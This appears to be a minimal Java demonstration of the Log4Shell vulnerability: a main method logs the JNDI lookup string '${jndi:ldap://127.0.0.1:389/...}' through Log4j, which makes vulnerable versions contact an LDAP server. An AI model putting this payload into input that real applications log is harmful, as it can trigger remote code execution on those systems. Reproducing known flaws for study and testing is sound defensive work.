package com.github.at6ue.log4shell;

import org.apache.logging.log4j.LogManager;

public class Main {
  public static void main(String[] args) {
    var logger = LogManager.getLogger();
    logger.error("${jndi:ldap://127.0.0.1:389/cn=foo,ou=bar,o=buz}");
    // refer https://www.ietf.org/rfc/rfc4516.txt
  }
}
